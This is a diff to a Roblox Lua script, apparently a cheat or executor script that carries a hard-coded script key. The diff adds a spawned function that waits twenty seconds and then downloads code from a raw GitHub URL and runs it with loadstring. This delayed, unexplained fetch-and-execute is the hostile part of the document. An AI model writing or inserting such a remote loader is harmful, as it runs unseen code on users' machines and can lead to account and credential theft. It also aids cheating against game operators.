@@ -1,4 +1,10 @@
 repeat wait(10) until game:IsLoaded()
+
+spawn(function()
+wait(20)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/r6dt/farm/main/x2"))()
+end)
+
 script_key = "woDAiRnSvDHmTqjAOjFOaREQqMduBaog";
 -- getgenv().GRANK_FIRST = true
 -- getgenv().GEVENT_FPS = 5
